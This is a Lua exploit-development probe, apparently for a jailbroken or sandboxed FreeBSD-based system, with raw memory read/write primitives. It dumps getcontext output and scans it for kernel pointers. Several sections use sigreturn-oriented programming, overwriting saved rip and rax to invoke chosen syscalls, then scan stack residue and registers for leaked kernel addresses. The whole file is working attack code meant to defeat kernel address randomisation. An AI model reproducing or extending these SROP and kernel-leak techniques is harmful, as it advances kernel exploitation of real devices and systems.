-- CRASH_CLASS: LOW
-- PROBE 142z2: Lean mcontext scan for kernel pointer residue

print("=== PROBE 142z2: MCTX SCAN ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return string.format("0x%X", tonumber(v) or 0)
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function wq(addr, val) memory.write_qword(addr, val) end
local function wd(addr, val) memory.write_dword(addr, val) end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end

local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local MC = 0x40

--------------------------------------------------------------------
-- [A] Full getcontext dump
--------------------------------------------------------------------
print("--- [A] getcontext ---")

local ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(ctx)) end)

-- Scan every qword for kernel pointers
for off = 0, 0x4F8, 8 do
    local q = safe_rq(ctx + off)
    if q then
        local h, l = get_hi_lo(q)
        if h >= 0xFFFF8000 then
            print("[A] *** KPTR +" .. string.format("%03X", off) .. "=" .. hex(q))
        end
    end
end

-- Dump key fields: registers, trapno, flags, FPU header
local fields = {
    {0x40, "onstack"}, {0x48, "rdi"}, {0x50, "rsi"}, {0x58, "rdx"},
    {0x60, "rcx"}, {0x68, "r8"}, {0x70, "r9"}, {0x78, "rax"},
    {0x80, "rbx"}, {0x88, "rbp"}, {0x90, "r10"}, {0x98, "r11"},
    {0xA0, "r12"}, {0xA8, "r13"}, {0xB0, "r14"}, {0xB8, "r15"},
    {0xC0, "trapno"}, {0xC8, "fs"}, {0xD0, "gs"}, {0xD8, "addr"},
    {0xE0, "rip"}, {0xE8, "cs"}, {0xF0, "rflags"}, {0xF8, "rsp"},
    {0x100, "ss"}, {0x108, "len"}, {0x110, "fpformat"}, {0x118, "ownedfp"},
    {0x120, "flags"},
}
for _, f in ipairs(fields) do
    local q = safe_rq(ctx + f[1])
    if q then
        local h, l = get_hi_lo(q)
        if h ~= 0 or l ~= 0 then
            print("[A] " .. f[2] .. "=" .. hex(q))
        end
    end
end

-- FPU state starts at mc+0x128 = ctx+0x168
-- FXSAVE header is 32 bytes, then XMM registers
print("")
print("[A] FPU area (first 128 bytes):")
for off = 0x168, 0x1E8, 8 do
    local q = safe_rq(ctx + off)
    if q then
        local h, l = get_hi_lo(q)
        if h ~= 0 or l ~= 0 then
            print("[A] fp+" .. string.format("%02X", off - 0x168) .. "=" .. hex(q))
        end
    end
end

--------------------------------------------------------------------
-- [B] SROP then getcontext: compare
--------------------------------------------------------------------
print("")
print("--- [B] Post-SROP ---")

local sctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(sctx)) end)
local rip_val = memory.read_qword(sctx + MC + 0xA0)
local rh, rl = get_hi_lo(rip_val)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))

-- SROP: just getpid
wq(sctx + MC + 0xA0, sc_addr)
wq(sctx + MC + 0x78, uint64(20))
pcall(function() return sc_sr(uint64(sctx)) end)

-- Fresh getcontext
local pctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(pctx)) end)

-- Scan for kernel pointers
for off = 0, 0x4F8, 8 do
    local q = safe_rq(pctx + off)
    if q then
        local h, l = get_hi_lo(q)
        if h >= 0xFFFF8000 then
            print("[B] *** KPTR +" .. string.format("%03X", off) .. "=" .. hex(q))
        end
    end
end

-- Check trapno/addr after SROP
local t2 = safe_rq(pctx + 0xC0)
local a2 = safe_rq(pctx + 0xD8)
print("[B] trapno=" .. hex(t2) .. " addr=" .. hex(a2))

--------------------------------------------------------------------
-- [C] Stack residue: read below RSP
--------------------------------------------------------------------
print("")
print("--- [C] Stack residue ---")

-- Current RSP from getcontext
local rsp_val = safe_rq(pctx + 0xF8)
local rsph, rspl = get_hi_lo(rsp_val)
print("[C] rsp=" .. hex(rsp_val))

-- Read 256 bytes below RSP (previous stack frames may have kernel residue)
if rsph ~= 0 or rspl > 0x200 then
    local scan_base = rspl - 0x100  -- 256 bytes below
    local scan_addr = uint64(string.format("0x%X%08X", rsph, scan_base))

    for off = 0, 0xF8, 8 do
        local addr = uint64(string.format("0x%X%08X", rsph, scan_base + off))
        local q = safe_rq(addr)
        if q then
            local h, l = get_hi_lo(q)
            if h >= 0xFFFF8000 then
                print("[C] *** KPTR rsp-" .. string.format("%X", 0x100 - off) .. "=" .. hex(q))
            end
        end
    end
    print("[C] stack scan done")
end

--------------------------------------------------------------------
-- [D] Syscall return value in extended regs
-- Some syscalls might leave kernel addresses in unused return regs
--------------------------------------------------------------------
print("")
print("--- [D] Syscall return residue ---")

-- Call various syscalls via SROP and check ALL registers after
local test_calls = {20, 311, 116, 13, 362}  -- getpid, getppid, geteuid, sigprocmask, kqueue
for _, sn in ipairs(test_calls) do
    local tctx = memory.alloc(0x500)
    pcall(function() return sc_gc(uint64(tctx)) end)
    local trip = memory.read_qword(tctx + MC + 0xA0)
    local trh, trl = get_hi_lo(trip)
    local tsc = uint64(string.format("0x%X%08X", trh, trl - 2))

    wq(tctx + MC + 0xA0, tsc)
    wq(tctx + MC + 0x78, uint64(sn))
    pcall(function() return sc_sr(uint64(tctx)) end)

    -- Get context after syscall
    pcall(function() return sc_gc(uint64(tctx)) end)

    -- Check rcx, r11, r8, r9, r10 for kernel residue
    local rcx = safe_rq(tctx + 0x60) -- rcx
    local r11 = safe_rq(tctx + 0x98) -- r11
    local r8 = safe_rq(tctx + 0x68)  -- r8
    local r10 = safe_rq(tctx + 0x90) -- r10

    local msg = "sys" .. sn .. ":"
    local found = false
    for _, r in ipairs({{rcx, "rcx"}, {r11, "r11"}, {r8, "r8"}, {r10, "r10"}}) do
        if r[1] then
            local rh2, rl2 = get_hi_lo(r[1])
            if rh2 >= 0xFFFF8000 then
                msg = msg .. " " .. r[2] .. "=" .. hex(r[1]) .. " KPTR!"
                found = true
            end
        end
    end
    if found then
        print("[D] " .. msg)
    end
end
print("[D] done")

print("")
print("=== DONE ===")
